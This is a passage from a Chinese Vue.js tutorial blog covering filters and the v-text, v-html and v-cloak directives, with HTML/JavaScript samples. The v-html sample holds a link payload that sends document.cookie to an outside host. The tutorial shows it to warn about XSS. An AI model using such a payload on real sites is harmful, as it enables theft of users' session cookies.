type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。</span><br><span class="line"></span><br><span class="line">    //使用computed属性实现   </span><br><span class="line">    const vm = new Vue(&#123;</span><br><span class="line">        el: &#x27;#root&#x27;,</span><br><span class="line">        data: &#123;</span><br><span class="line">            account: &#x27;&#x27;,</span><br><span class="line">            password: &#x27;&#x27;,</span><br><span class="line">            sex: &#x27;male&#x27;,</span><br><span class="line">            hobby: [],</span><br><span class="line">            city: &#x27;&#x27;,</span><br><span class="line">            agree: &#x27;&#x27;,</span><br><span class="line">            other: &#x27;&#x27;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line">            demo() &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>过滤器<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/dayjs.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- </span></span></span><br><span class="line"><span class="comment"><span class="xml">过滤器：</span></span></span><br><span class="line"><span class="comment"><span class="xml">定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。</span></span></span><br><span class="line"><span class="comment"><span class="xml">语法：</span></span></span><br><span class="line"><span class="comment"><span class="xml">1.注册过滤器：Vue.filter(name,callback) 或 new Vue&#123;filters:&#123;&#125;&#125;</span></span></span><br><span class="line"><span class="comment"><span class="xml">2.使用过滤器：&#123;&#123; xxx | 过滤器名&#125;&#125;  或  v-bind:属性 = &quot;xxx | 过滤器名&quot;</span></span></span><br><span class="line"><span class="comment"><span class="xml">备注：</span></span></span><br><span class="line"><span class="comment"><span class="xml">1.过滤器也可以接收额外参数、多个过滤器也可以串联</span></span></span><br><span class="line"><span class="comment"><span class="xml">2.并没有改变原本的数据, 是产生新的对应的数据</span></span></span><br><span class="line"><span class="comment"><span class="xml">--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>显示格式化后的时间<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 计算属性实现 --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>现在是：&#123;&#123;fmtTime&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- methods实现 --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>现在是：&#123;&#123;getFmtTime()&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 过滤器实现 --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>现在是：&#123;&#123;time | timeFormater&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 过滤器实现（传参） --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>现在是：&#123;&#123;time | timeFormater(&#x27;YYYY_MM_DD&#x27;) | mySlice&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h3</span> <span class="attr">:x</span>=<span class="string">&quot;msg | mySlice&quot;</span>&gt;</span>尚硅谷<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root2&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;msg | mySlice&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">Vue.config.productionTip = <span class="literal">false</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">//全局过滤器</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">Vue.filter(<span class="string">&#x27;mySlice&#x27;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">value</span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">return</span> value.slice(<span class="number">0</span>,<span class="number">4</span>)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;)</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">new</span> Vue(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">data</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">time</span>:<span class="number">1621561377603</span>, <span class="comment">//时间戳</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">msg</span>:<span class="string">&#x27;你好，尚硅谷&#x27;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">computed</span>: &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">fmtTime</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">return</span> dayjs(<span class="built_in">this</span>.time).format(<span class="string">&#x27;YYYY年MM月DD日 HH:mm:ss&#x27;</span>)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">methods</span>: &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">getFmtTime</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">return</span> dayjs(<span class="built_in">this</span>.time).format(<span class="string">&#x27;YYYY年MM月DD日 HH:mm:ss&#x27;</span>)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">//局部过滤器</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">filters</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">timeFormater</span>(<span class="params">value,str=<span class="string">&#x27;YYYY年MM月DD日 HH:mm:ss&#x27;</span></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">// console.log(&#x27;@&#x27;,value)</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">return</span> dayjs(value).format(str)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;)</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">new</span> Vue(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">el</span>:<span class="string">&#x27;#root2&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">data</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">msg</span>:<span class="string">&#x27;hello,atguigu!&#x27;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;)</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="内置指令"><a href="#内置指令" class="headerlink" title="内置指令"></a>内置指令</h2><h3 id="v-text"><a href="#v-text" class="headerlink" title="v-text"></a>v-text</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v-text会替换标签里的内容，&#123;&#123;&#125;&#125;不会替换</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>v-text指令<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 引入Vue --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- </span></span></span><br><span class="line"><span class="comment"><span class="xml">我们学过的指令：</span></span></span><br><span class="line"><span class="comment"><span class="xml">v-bind: 单向绑定解析表达式, 可简写为 :xxx</span></span></span><br><span class="line"><span class="comment"><span class="xml">v-model: 双向数据绑定</span></span></span><br><span class="line"><span class="comment"><span class="xml">v-for  : 遍历数组/对象/字符串</span></span></span><br><span class="line"><span class="comment"><span class="xml">v-on   : 绑定事件监听, 可简写为@</span></span></span><br><span class="line"><span class="comment"><span class="xml">v-if  : 条件渲染（动态控制节点是否存存在）</span></span></span><br><span class="line"><span class="comment"><span class="xml">v-else : 条件渲染（动态控制节点是否存存在）</span></span></span><br><span class="line"><span class="comment"><span class="xml">v-show : 条件渲染 (动态控制节点是否展示)</span></span></span><br><span class="line"><span class="comment"><span class="xml">v-text指令：</span></span></span><br><span class="line"><span class="comment"><span class="xml">1.作用：向其所在的节点中渲染文本内容。</span></span></span><br><span class="line"><span class="comment"><span class="xml">2.与插值语法的区别：v-text会替换掉节点中的内容，&#123;&#123;xx&#125;&#125;则不会。</span></span></span><br><span class="line"><span class="comment"><span class="xml">--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>你好，&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-text</span>=<span class="string">&quot;name&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-text</span>=<span class="string">&quot;str&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止 vue 在启动时生成生产提示。</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">new</span> Vue(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">data</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">name</span>:<span class="string">&#x27;尚硅谷&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">str</span>:<span class="string">&#x27;&lt;h3&gt;你好啊！&lt;/h3&gt;&#x27;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;)</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="v-html"><a href="#v-html" class="headerlink" title="v-html"></a>v-html</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>v-html指令<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 引入Vue --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- </span></span></span><br><span class="line"><span class="comment"><span class="xml">v-html指令：</span></span></span><br><span class="line"><span class="comment"><span class="xml">1.作用：向指定节点中渲染包含html结构的内容。</span></span></span><br><span class="line"><span class="comment"><span class="xml">2.与插值语法的区别：</span></span></span><br><span class="line"><span class="comment"><span class="xml">(1).v-html会替换掉节点中所有的内容，&#123;&#123;xx&#125;&#125;则不会。</span></span></span><br><span class="line"><span class="comment"><span class="xml">(2).v-html可以识别html结构。</span></span></span><br><span class="line"><span class="comment"><span class="xml">3.严重注意：v-html有安全性问题！！！！</span></span></span><br><span class="line"><span class="comment"><span class="xml">(1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。</span></span></span><br><span class="line"><span class="comment"><span class="xml">(2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！</span></span></span><br><span class="line"><span class="comment"><span class="xml">--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>你好，&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-html</span>=<span class="string">&quot;str&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-html</span>=<span class="string">&quot;str2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止 vue 在启动时生成生产提示。</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">new</span> Vue(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">data</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">name</span>:<span class="string">&#x27;尚硅谷&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">str</span>:<span class="string">&#x27;&lt;h3&gt;你好啊！&lt;/h3&gt;&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">str2</span>:<span class="string">&#x27;&lt;a href=javascript:location.href=&quot;http://www.baidu.com?&quot;+document.cookie&gt;兄弟我找到你想要的资源了，快来！&lt;/a&gt;&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;)</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="v-cloak"><a href="#v-cloak" class="headerlink" title="v-cloak"></a>v-cloak</h3><p>css属性选择器</p><table><thead><tr><th>[<a href="https://www.w3school.com.cn/cssref/selector_attribute.asp"><em>attribute</em>]</a></th><th>[target]</th><th>选择带有 target 属性的所有元素。</th></tr></thead><tbody><tr><td>[<a href="https://www.w3school.com.cn/cssref/selector_attribute_value.asp"><em>attribute</em>=<em>value</em>]</a></td><td>[target=_blank]</td><td>选择带有 target=”_blank” 属性的所有元素。</td></tr><tr><td>[<a href="https://www.w3school.com.cn/cssref/selector_attribute_value_contain.asp"><em>attribute</em>~=<em>value</em>]</a></td><td>[title~=flower]</td><td>选择 title 属性包含单词 “flower” 的所有元素。</td></tr><tr><td>[<a href="https://www.w3school.com.cn/cssref/selector_attribute_value_start.asp"><em>attribute</em>|=<em>value</em>]</a></td><td>[lang|=en]</td><td>选择 lang 属性值以 “en” 开头的所有元素。</td></tr><tr><td>[<a href="https://www.w3school.com.cn/cssref/selector_attr_begin.asp"><em>attribute</em>^=<em>value</em>]</a></td><td>a[href^=”https”]</td><td>选择其 src 属性值以 “https” 开头的每个 <a> 元素。</td></tr><tr><td>[<a href="https://www.w3school.com.cn/cssref/selector_attr_end.asp"><em>attribute</em>$=<em>value</em>]</a></td><td>a[href$=”.pdf”]</td><td>选择其 src 属性以 “.pdf” 结尾的所有 <a> 元素。</td></tr><tr><td>[<a href="https://www.w3school.com.cn/cssref/selector_attr_contain.asp"><em>attribute</em>*=<em>value</em>]</a></td><td>a[href*=”w3schools”]</td><td>选择其 href 属性值中包含 “abc” 子串的每个 <a> 元素。</td></tr></tbody></table><p>v-cloak主要解决网络卡顿时，避免未被Vue解析的内容显示在页面上</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>v-cloak指令<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="selector-attr">[v-cloak]</span>&#123;</span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="attribute">display</span>:none;</span></span></span><br><span class="line"><span class="css"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="css"><span class="xml"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 引入Vue --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- </span></span></span><br><span class="line"><span class="comment"><span class="xml">v-cloak指令（没有值）：</span></span></span><br><span class="line"><span class="comment"><span class="xml">1.本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。</span></span></span><br><span class="line"><span class="comment"><span class="xml">2.使用css配合v-cloak可以解决网速慢时页面展示出&#123;&#123;xxx&#125;&#125;的问题。</span></span></span><br><span class="line"><span class="comment"><span class="xml">--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-cloak</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://localhost:8080/resource/5s/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span 